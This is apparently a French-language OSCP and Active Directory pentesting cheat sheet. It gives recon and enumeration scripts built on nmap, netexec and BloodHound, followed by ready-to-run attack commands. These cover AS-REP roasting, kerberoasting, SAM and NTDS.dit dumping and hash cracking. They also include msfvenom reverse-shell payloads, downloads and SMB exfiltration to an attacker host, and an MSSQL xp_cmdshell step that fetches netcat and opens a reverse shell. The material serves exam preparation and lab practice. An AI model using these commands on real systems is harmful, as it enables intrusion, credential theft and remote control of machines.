# 🏅 OSCP Cheat Sheet

{% hint style="success" %}
Ce document regroupe tout ce que j’ai appris au travers des box et des cours de préparation aux techniques d’exploitation Active Directory. Il reflète mon expérience personnelle et n’engage que moi. Je ne couvre pas ici les techniques les plus avancées, mais vous pouvez vous tourner vers d’autres ressources comme [The Hacker Recipes](https://www.thehacker.recipes/) pour approfondir le sujet.
{% endhint %}

***

## 🔎**Recon**

<details>

<summary>Port scanning and version scraping</summary>

```python
#!/usr/bin/env python3
import argparse
import subprocess
import os
import time
from datetime import datetime

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution: {e}")
        return None

def create_output_dir(base_dir="oscp_scans"):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"{base_dir}_{timestamp}"
    os.makedirs(output_dir, exist_ok=True)
    return output_dir

def quick_scan(target, output_dir, scan_type="tcp"):
    print(f"\n[⚡] Début du scan {scan_type.upper()} rapide...")
    output_file = f"{output_dir}/initial_scan_{scan_type}.nmap"
    command = f"nmap -v -n -Pn -sS -T4 --max-retries 1 --min-rate 1000 -p- {target} -oN {output_file}"
    if scan_type == "udp":
        command = f"nmap -v -n -Pn -sU -T4 --max-retries 1 --min-rate 500 -p- {target} -oN {output_file}"
    
    run_command(command)
    return parse_open_ports(output_file)

def parse_open_ports(nmap_file):
    ports = []
    with open(nmap_file, 'r') as f:
        for line in f:
            if '/tcp' in line and 'open' in line:
                ports.append(line.split('/')[0])
            elif '/udp' in line and 'open' in line:
                ports.append(line.split('/')[0])
    return ','.join(ports)

def deep_scan(target, ports, output_dir, scan_type="tcp"):
    if not ports:
        return
    
    print(f"\n[🔍] Scan approfondi {scan_type.upper()} sur les ports: {ports}")
    output_file = f"{output_dir}/deep_scan_{scan_type}.nmap"
    command = f"nmap -v -n -Pn -sCV -T4 -p{ports} {target} -oN {output_file}"
    if scan_type == "udp":
        command = f"nmap -v -n -Pn -sU -sCV -T4 -p{ports} {target} -oN {output_file}"
    
    run_command(command)
    return output_file

def parse_versions(nmap_file, output_dir):
    print(f"\n[📄] Extraction des versions logicielles...")
    versions = []
    
    with open(nmap_file, 'r') as f:
        for line in f:
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 4:
                    port_proto = parts[0]
                    service = parts[2]
                    version = ' '.join(parts[4:])
                    versions.append(f"{port_proto} - {service} {version}")
    
    version_file = f"{output_dir}/versions.txt"
    with open(version_file, 'w') as f:
        f.write("=== Versions logicielles détectées ===\n\n")
        f.write('\n'.join(versions))
    
    print(f"[✅] Versions sauvegardées dans: {version_file}")

def main():
    parser = argparse.ArgumentParser(description="OSCP Recon Scanner")
    parser.add_argument("target", help="Cible à scanner")
    parser.add_argument("-o", "--output", help="Répertoire de sortie")
    parser.add_argument("--udp", action="store_true", help="Activer le scan UDP")
    args = parser.parse_args()

    output_dir = args.output or create_output_dir()
    open_ports = {'tcp': '', 'udp': ''}

    # Scan TCP
    open_ports['tcp'] = quick_scan(args.target, output_dir, "tcp")
    deep_scan_file = deep_scan(args.target, open_ports['tcp'], output_dir, "tcp")
    
    # Scan UDP si activé
    if args.udp:
        open_ports['udp'] = quick_scan(args.target, output_dir, "udp")
        deep_scan_file = deep_scan(args.target, open_ports['udp'], output_dir, "udp")

    # Extraction des versions
    if deep_scan_file:
        parse_versions(deep_scan_file, output_dir)
    
    print(f"\n[🎉] Scan terminé! Résultats dans: {output_dir}")

if __name__ == "__main__":
    main()
```

</details>

<details>

<summary>AD scanning</summary>

```bash
#!/bin/bash

# Configuration
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'
OUTPUT_DIR="AD_Recon_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR/{bloodhound,shares,users,services}

# Vérification des dépendances
check_deps() {
    command -v bloodhound-python >/dev/null 2>&1 || echo -e "${RED}[-] bloodhound-python non installé!${NC}"
    command -v jq >/dev/null 2>&1 || echo -e "${RED}[-] jq non installé!${NC}"
}

# Fonction d'énumération SMB avancée
smb_enum() {
    echo -e "\n${CYAN}[=== SMB Enumération ===]${NC}"
    
    # Scan complet SMB
    netexec smb $IP -u $USER -p $PASSWORD -d $DOMAIN --shares --sessions --disks --loggedon-users --users --groups --rid-brute --pass-pol --ntds --kerberos --gpo | tee $OUTPUT_DIR/smb_full.txt
    
    # Extraction des shares accessibles
    grep "READ" $OUTPUT_DIR/smb_full.txt | awk '{print $2}' | sort -u > $OUTPUT_DIR/shares/available_shares.txt
    
    # Téléchargement des shares
    while read share; do
        echo -e "${YELLOW}[*] Téléchargement du share: $share${NC}"
        smbclient -U "$DOMAIN/$USER%$PASSWORD" "//$IP/$share" -c "recurse; prompt; mget *" -Tc $OUTPUT_DIR/shares/${share}_download >/dev/null 2>&1
    done < $OUTPUT_DIR/shares/available_shares.txt
    
    # Vérification des droits d'écriture
    netexec smb $IP -u $USER -p $PASSWORD -d $DOMAIN --spider-share '.*' --check-write | tee $OUTPUT_DIR/shares/writable_shares.txt
}

# Enumération LDAP complète
ldap_enum() {
    echo -e "\n${CYAN}[=== LDAP Enumération ===]${NC}"
    
    # Extraction users avec descriptions
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --users --verbose | tee $OUTPUT_DIR/ldap_full.txt
    grep -i "description:" $OUTPUT_DIR/ldap_full.txt | awk -F '│' '{print $3,$5}' | column -t > $OUTPUT_DIR/users/user_descriptions.txt
    
    # Extraction propre des usernames
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --users --json | jq -r '.hosts[].users[] | .username' | sort -u > $OUTPUT_DIR/users/all_users.txt
    
    # Trusts et Password Policy
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --trusts --password-policy | tee $OUTPUT_DIR/ldap_trusts_pol.txt
}

# Enumération MSSQL
mssql_enum() {
    echo -e "\n${CYAN}[=== MSSQL Enumération ===]${NC}"
    
    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --query "SELECT name FROM sys.databases" | tee $OUTPUT_DIR/services/mssql_databases.txt
    
    # Test xp_cmdshell
    echo -e "${YELLOW}[*] Test xp_cmdshell${NC}"
    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --enable-xp-cmdshell
    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --xp-cmd "whoami /all" | tee $OUTPUT_DIR/services/mssql_xp_cmdshell.txt
}

# Enumération RDP
rdp_enum() {
    echo -e "\n${CYAN}[=== RDP Checks ===]${NC}"
    netexec winrm $IP -u $USER -p $PASSWORD -d $DOMAIN --local-groups --users | tee $OUTPUT_DIR/services/rdp_access.txt
}

# BloodHound Ingestor
bloodhound_enum() {
    echo -e "\n${CYAN}[=== BloodHound Collection ===]${NC}"
    
    if command -v bloodhound-python &> /dev/null; then
        bloodhound-python -c All -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc "$IP" --zip --dns-tcp --disable-pooling -o "$OUTPUT_DIR/bloodhound"
        echo -e "${GREEN}[+] Fichiers BloodHound générés dans: $OUTPUT_DIR/bloodhound${NC}"
    else
        echo -e "${RED}[-] bloodhound-python non installé!${NC}"
    fi
}

# Low Hanging Fruits Checks
low_hanging_fruits() {
    echo -e "\n${CYAN}[=== Low Hanging Fruits ===]${NC}"
    
    # Password Policy
    grep "Password Policy" $OUTPUT_DIR/ldap_trusts_pol.txt | tee $OUTPUT_DIR/lhf/password_policy.txt
    
    # AS-REP Roastable Users
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --asreproast | tee $OUTPUT_DIR/lhf/asrep_roast.txt
    
    # Admin Access Check
    netexec smb $IP -u $USER -p $PASSWORD -d $DOMAIN --admin-check | tee $OUTPUT_DIR/lhf/admin_access.txt
    
    # MSSQL Admin Check
    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --is-admin | tee $OUTPUT_DIR/lhf/mssql_admin.txt
    
    # Unconstrained Delegation
    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --unconstrained | tee $OUTPUT_DIR/lhf/unconstrained_deleg.txt
    
    # GPO vulnérables
    grep -i "vulnerable" $OUTPUT_DIR/smb_full.txt | tee $OUTPUT_DIR/lhf/vuln_gpo.txt
}

# Main
if [ $# -ne 4 ]; then
    echo -e "${RED}Usage: $0 <IP> <USER> <PASSWORD> <DOMAIN>${NC}"
    exit 1
fi

IP=$1
USER=$2
PASSWORD=$3
DOMAIN=$4

check_deps
smb_enum
ldap_enum
mssql_enum
rdp_enum
bloodhound_enum
low_hanging_fruits

# Mise à jour DNS
echo -e "\n${CYAN}[=== DNS Update ===]${NC}"
grep -iE "(Domain|Forest):" $OUTPUT_DIR/ldap_*.txt | awk '{print $NF}' | sort -u | while read domain; do
    echo "$IP $domain" | sudo tee -a /etc/hosts
    echo "$IP $(echo $domain | cut -d'.' -f1)" | sudo tee -a /etc/hosts
    
    # Zone Transfer Test
    dig @$IP $domain axfr | tee $OUTPUT_DIR/dns_zone_transfer.txt
done

# Rapport Final
echo -e "\n${GREEN}[+] Recon complete!${NC}"
echo -e "${CYAN}[*] Points d'intérêt:${NC}"
grep -iHn "vulnerable\|writable\|admin\|asrep\|delegation" $OUTPUT_DIR/*/*.txt
echo -e "\n${GREEN}[+] Les credentials BloodHound: $USER:$PASSWORD${NC}"
```

</details>

<details>

<summary>Common services (SNMP, HTTP, SMB, FTP, SSH, RDP, MYSQL, MSSQL, DNS, SMTP, POP3, IMAP)</summary>

```bash
#!/bin/bash

# Configuration
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'
OUTPUT_DIR="Service_Scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

# Dictionnaire de services avec commandes associées
declare -A SERVICE_SCANS=(
    ["SNMP"]="snmp_scan"
    ["HTTP"]="http_scan"
    ["SMB"]="smb_scan"
    ["FTP"]="ftp_scan"
    ["SSH"]="ssh_scan"
    ["RDP"]="rdp_scan"
    ["MYSQL"]="mysql_scan"
    ["MSSQL"]="mssql_scan"
    ["DNS"]="dns_scan"
    ["SMTP"]="smtp_scan"
    ["POP3"]="pop3_scan"
    ["IMAP"]="imap_scan"
)

# Fonctions d'énumération par service
snmp_scan() {
    local ip=$1
    echo -e "\n${CYAN}[SNMP] Running scan on $ip${NC}"
    
    # Scan de communauté SNMP
    echo "=== SNMP COMMUNITIES ===" > $OUTPUT_DIR/SNMP.txt
    snmpwalk -v2c -c public $ip 2>/dev/null | tee -a $OUTPUT_DIR/SNMP.txt
    snmp-check -c public -v2c $ip >> $OUTPUT_DIR/SNMP.txt 2>&1
    
    # Recherche de mots-clés
    grep -E -i "version|community|string|vulnerable|Cisco|config" $OUTPUT_DIR/SNMP.txt | sort -u > $OUTPUT_DIR/SNMP_KEYWORDS.txt
}

http_scan() {
    local ip=$1
    echo -e "\n${CYAN}[HTTP] Running scan on $ip${NC}"
    
    # Scan de base
    nikto -h $ip -output $OUTPUT_DIR/HTTP_NIKTO.txt
    whatweb $ip --color=never > $OUTPUT_DIR/HTTP_WHATWEB.txt
    
    # Détection de CMS
    wget -qO- $ip | grep -E -i "wp-content|drupal|joomla|wordpress" >> $OUTPUT_DIR/HTTP_CMS.txt
}

smb_scan() {
    local ip=$1
    echo -e "\n${CYAN}[SMB] Running scan on $ip${NC}"
    
    netexec smb $ip --shares --users --groups --pass-pol > $OUTPUT_DIR/SMB_NETEXEC.txt
    enum4linux -a $ip >> $OUTPUT_DIR/SMB_ENUM4LINUX.txt 2>&1
    
    grep -E -i "READ|WRITE|VERSION|ADMIN|PASSWORD" $OUTPUT_DIR/SMB_*.txt > $OUTPUT_DIR/SMB_KEYWORDS.txt
}

# ... (autres scan à ajouter plus tard)

main() {
    echo -e "${GREEN}=== Service Enumeration Tool ===${NC}"
    read -p "Target IP/Host: " TARGET
    echo -e "${YELLOW}Available services: ${!SERVICE_SCANS[@]}${NC}"
    read -p "Enter services (comma-separated): " SERVICES
    
    IFS=',' read -ra SERVICE_LIST <<< "$SERVICES"
    
    for service in "${SERVICE_LIST[@]}"; do
        service=$(echo $service | xargs) # Nettoyage
        if [[ -n "${SERVICE_SCANS[$service]}" ]]; then
            ${SERVICE_SCANS[$service]} $TARGET
        else
            echo -e "${RED}[!] Service non supporté: $service${NC}"
        fi
    done
    
    generate_report
}

generate_report() {
    echo -e "\n${GREEN}=== Scan Report ===${NC}"
    echo -e "Target: $TARGET"
    echo -e "Services scannés: ${SERVICE_LIST[@]}"
    
    # Résumé des findings
    grep -EH -i "vulnerable|admin|password|version|CVE-" $OUTPUT_DIR/*.txt > $OUTPUT_DIR/CRITICAL_FINDINGS.txt
    grep -H -i "user" $OUTPUT_DIR/*.txt > $OUTPUT_DIR/USER_FINDINGS.txt
    
    echo -e "\n${CYAN}[!] Points critiques (Vérifier CRITICAL_FINDINGS.txt):${NC}"
    cat $OUTPUT_DIR/CRITICAL_FINDINGS.txt | awk '!seen[$0]++'
    
    echo -e "\n${GREEN}[+] Scan complet. Résultats dans: $OUTPUT_DIR${NC}"
}

# Démarrage
main
```

</details>

## **🛡️ Active Directory Cheat Sheet**

### 📌 Reconnaissance & Énumération

<details>

<summary>🔍LDAP <strong>Enumeration</strong></summary>

*   **Énumération LDAP anonyme**

    ```bash
    ldapsearch -v -x -b "DC=<DOMAIN>,DC=com" -H "ldap://<IP>" "(objectclass=*)"
    ```
*   **Énumération LDAP auth (LAPS Password)**

    ```bash
    ldapsearch -x -H "ldap://<IP>" -D "<DOMAIN>\<USER>" -w "<PASSWORD>" -b "DC=<DOMAIN>,DC=com" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
    ```
*   **Énumération with Windapsearch**

    ```bash
    ./windapsearch.py --dc-ip <IP> -u "" -U
    ```
*   **Extraction of users and descriptions via NetExec**

    ```bash
    #users
    nxc ldap $ip -u $user -p $password --users
    #desc
    nxc ldap "<DC>" -d "<DOMAIN>" -u "<USER>" -p "<PASSWORD>" -M get-desc
    ```
*   **Testing if an account exists without kerberos protocol**

    ```bash
    nxc ldap 192.168.1.0/24 -u users.txt -p '' -k
    #mode 18200 hashcat
    ```
*   **Asreproasting**

    ```bash
    nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
    ```
*   **Kerberoasting**

    ```bash
    nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
    #mode 13100 hashcat
    ```
*   **Bloodhound collector**

    ```bash
    nxc ldap <ip> -u user -p pass --bloodhound --collection All
    ```

Rest later

</details>

<details>

<summary>📂 SMB Enumeration</summary>

*   **List SMB Shares and users**

    ```bash
    crackmapexec smb <IP> --shares -u <USER> -p <PASSWORD> --users
    # command to get clean users.txt -> awk '{print $5}' > users.txt
    ```
*   **Brute force RID for user enumeration**

    ```bash
    nxc smb <IP> -u '' -p '' --rid-brut
    ```
*   **List SMB shares anonymous**

    ```bash
    smbclient -L //<IP> -N
    ```
*   **Dumping all files in the share**

    ```bash
    nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
    ```
*   **Dump SAM with admin privileges (--local-auth possible)**

    ```bash
    nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
    ```
*   **Dump NTDS.dit with DomainAdmin or Local Admin**

    ```bash
    nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
    ```

There are plenty of Credentials discovery commands, no need to put everything, commands here: [https://www.netexec.wiki/smb-protocol/obtaining-credentials](https://www.netexec.wiki/smb-protocol/obtaining-credentials)

</details>

####

#### 🎯 **Droits Windows (Privilege Escalation)**

* **SeBackupPrivilege** → Lire des fichiers normalement inaccessibles
* **SeRestorePrivilege** → Écraser des fichiers protégés
* **SeImpersonatePrivilege** → Exploitable avec JuicyPotato pour devenir SYSTEM
* **SeLoadDriverPrivilege** → Charger des drivers malveillants

***

### 💥 Cracking des Hashes

*   **NTLM**

    ```bash
    hashcat -m 1000 -a 3 hash.txt
    ```
*   **NetNTLMv1**

    ```bash
    hashcat -m 5500 -a 3 hash.txt
    ```
*   **NetNTLMv2**

    ```bash
    john --format=netntlmv2 hash.txt
    ```
*   **SPN Hash (Kerberoasting)**

    ```bash
    hashcat -m 13100 -a 0 spn.txt rockyou.txt
    ```

***

### 🚀 Payloads & Reverse Shells

*   **Windows Meterpreter**

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > shell.exe
    ```
*   **Windows Shell Staged**

    ```bash
    msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > shell.exe
    ```
*   **PowerShell Reverse Shell**

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=<PORT> -f psh-cmd
    ```

***

### 🔄 Transfert de Fichiers

*   **Serveur HTTP Python**

    ```bash
    python3 -m http.server 80
    ```
*   **Télécharger un fichier via PowerShell**

    ```powershell
    powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>/file.exe' -OutFile 'C:\Users\Public\file.exe'"
    ```
*   **Exfiltration via SMB**

    ```bash
    smbclient //<ATTACKER_IP>/SHARE -U "USER" -c "put file.exe"
    ```

***

### 🏴‍☠️ Post-Exploitation

*   **Changement du mot de passe via RPC**

    ```bash
    setuserinfo <USER> 23 'NewPassword123!'
    ```
*   **Utilisation d’un ticket Kerberos pour MSSQL**

    ```bash
    export KRB5CCNAME=$PWD/Administrator.ccache
    ```
*   **Téléchargement de Netcat via MSSQL**

    ```bash
    xp_cmdshell "curl http://<ATTACKER_IP>/nc.exe -o c:\temp\nc.exe"
    ```
*   **Reverse Shell via MSSQL**

    ```bash
    xp_cmdshell "c:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"
    ```
